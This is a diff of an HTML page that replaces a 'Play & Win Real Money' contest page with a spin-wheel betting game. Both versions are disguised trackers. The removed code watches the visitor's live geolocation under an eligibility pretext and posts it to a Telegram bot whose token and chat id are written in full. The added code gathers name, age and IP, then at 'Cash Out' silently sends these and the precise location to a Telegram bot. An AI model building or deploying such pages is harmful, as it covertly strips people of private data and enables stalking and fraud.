@@ -1,90 +1,169 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>🎮 Play & Win Real Money</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin Wheel Game</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 30px;
-            background: linear-gradient(145deg, #00c6ff, #0072ff);
-            color: white;
-        }
-        .card {
-            background: white;
-            color: black;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            max-width: 400px;
-            margin: auto;
-        }
-        button {
-            background: #00c6ff;
-            color: white;
-            border: none;
-            padding: 15px 25px;
-            font-size: 18px;
-            border-radius: 10px;
-            cursor: pointer;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; }
+        #login, #game { margin: 20px auto; max-width: 600px; }
+        #wheel { width: 300px; height: 300px; margin: 20px auto; transition: transform 3s ease-out; }
+        #spinBtn, #cashOutBtn { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #history { max-height: 100px; overflow-y: auto; border: 1px solid #ccc; padding: 10px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>🎮 Play & Win Real Money</h2>
-        <p>We are verifying your eligibility for the contest by live tracking your location.</p>
-        <p>Please keep this page open while playing!</p>
-        <button onclick="startTracking()">Start Game</button>
+    <div id="login">
+        <h2>Login</h2>
+        <input type="text" id="name" placeholder="Your Name" required><br><br>
+        <input type="number" id="age" placeholder="Your Age" required><br><br>
+        <button onclick="startGame()">Start Game</button>
     </div>
 
-    <script>
-        let watchId = null;
+    <div id="game" class="hidden">
+        <h2>Spin Wheel Game</h2>
+        <p>Balance: <span id="balance">100</span> NPR</p>
+        <input type="number" id="bet" value="10" min="1" max="100"> NPR Bet<br><br>
+        <canvas id="wheel" width="300" height="300"></canvas><br>
+        <button id="spinBtn" onclick="spinWheel()">Spin Now</button>
+        <button id="cashOutBtn" onclick="cashOut()">Cash Out</button>
+        <p id="result"></p>
+        <div id="history"><strong>Spin History:</strong></div>
+    </div>
 
-        function startTracking() {
-            if (navigator.geolocation) {
-                watchId = navigator.geolocation.watchPosition(sendPosition, errorLocation, {
-                    enableHighAccuracy: true,
-                    maximumAge: 10000,
-                    timeout: 10000
-                });
-                alert("Live tracking started! Keep this tab open.");
+    <audio id="spinSound" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+    <audio id="winSound" src="https://www.soundjay.com/buttons/beep-07a.mp3"></audio>
+    <audio id="loseSound" src="https://www.soundjay.com/buttons/beep-02.mp3"></audio>
+
+    <script>
+        const outcomes = [
+            { text: "Win 50 NPR", value: 50 },
+            { text: "Lose 20 NPR", value: -20 },
+            { text: "Bankrupt", value: 0 },
+            { text: "Free Spin", value: 0 },
+            { text: "Jackpot 500 NPR", value: 500 }
+        ];
+        let balance = 100;
+        let ipAddress = "";
+        let userName = "";
+        let userAge = 0;
+        const canvas = document.getElementById("wheel");
+        const ctx = canvas.getContext("2d");
+        let spinning = false;
+
+        // Fetch IP address
+        async function fetchIP() {
+            const response = await fetch("https://api.ipify.org?format=json");
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Start game after login
+        async function startGame() {
+            userName = document.getElementById("name").value;
+            userAge = document.getElementById("age").value;
+            if (userName && userAge > 0) {
+                ipAddress = await fetchIP();
+                document.getElementById("login").classList.add("hidden");
+                document.getElementById("game").classList.remove("hidden");
+                drawWheel();
             } else {
-                alert("Geolocation is not supported by this browser.");
+                alert("Please enter a valid name and age.");
             }
         }
 
-        function sendPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            const time = new Date().toLocaleString();
-
-            fetch("https://api.telegram.org/bot7449325389:AAHlpvLyLfq5s4BQ15bB_kn13embow-SX64/sendMessage", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    chat_id: "5425481852",
-                    text: `📍 Live Location:
-Latitude: ${lat}
-Longitude: ${lon}
-Accuracy: ${acc}m
-Time: ${time}`
-                })
+        // Draw the spin wheel
+        function drawWheel() {
+            const arc = 2 * Math.PI / outcomes.length;
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            outcomes.forEach((outcome, i) => {
+                ctx.beginPath();
+                ctx.fillStyle = `hsl(${i * 360 / outcomes.length}, 70%, 50%)`;
+                ctx.moveTo(150, 150);
+                ctx.arc(150, 150, 150, arc * i, arc * (i + 1));
+                ctx.fill();
+                ctx.fillStyle = "white";
+                ctx.font = "16px Arial";
+                ctx.save();
+                ctx.translate(150, 150);
+                ctx.rotate(arc * i + arc / 2);
+                ctx.fillText(outcome.text, 60, 10);
+                ctx.restore();
             });
         }
 
-        function errorLocation(error) {
-            alert("❌ Unable to retrieve location. Please allow location access.");
+        // Spin the wheel
+        function spinWheel() {
+            if (spinning) return;
+            spinning = true;
+            document.getElementById("spinSound").play();
+            const bet = parseInt(document.getElementById("bet").value);
+            if (bet > balance) {
+                alert("Insufficient balance!");
+                spinning = false;
+                return;
+            }
+            const randomAngle = Math.floor(Math.random() * 360) + 1080; // 3 full spins + random
+            canvas.style.transform = `rotate(${randomAngle}deg)`;
+
+            setTimeout(() => {
+                const index = Math.floor(((randomAngle % 360) / 360) * outcomes.length);
+                const outcome = outcomes[outcomes.length - 1 - index];
+                updateGame(outcome, bet);
+                spinning = false;
+            }, 3000);
         }
 
-        window.addEventListener("beforeunload", () => {
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
+        // Update balance and history
+        function updateGame(outcome, bet) {
+            let change = outcome.value;
+            if (outcome.text.includes("Win") || outcome.text.includes("Jackpot")) {
+                change *= bet / 10; // Scale winnings with bet
+                document.getElementById("winSound").play();
+            } else if (outcome.text.includes("Lose")) {
+                change = -bet;
+                document.getElementById("loseSound").play();
+            } else if (outcome.text === "Bankrupt") {
+                balance = 0;
+                document.getElementById("loseSound").play();
             }
-        });
+            balance += change;
+            if (balance < 0) balance = 0;
+            document.getElementById("balance").textContent = balance;
+            document.getElementById("result").textContent = `Result: ${outcome.text}`;
+            document.getElementById("history").innerHTML += `<p>${outcome.text} (${change} NPR)</p>`;
+        }
+
+        // Cash out and send data
+        function cashOut() {
+            if (balance <= 0) {
+                alert("Nothing to cash out!");
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const { latitude, longitude, accuracy } = position.coords;
+                const data = {
+                    name: userName,
+                    age: userAge,
+                    ip: ipAddress,
+                    location: { latitude, longitude, accuracy },
+                    winnings: balance,
+                    timestamp: new Date().toISOString()
+                };
+                await fetch("https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: "<YOUR_CHAT_ID>",
+                        text: JSON.stringify(data, null, 2)
+                    })
+                });
+                alert("Cashed out successfully!");
+                balance = 0;
+                document.getElementById("balance").textContent = balance;
+            }, () => alert("Location access denied."));
+        }
     </script>
 </body>
 </html>
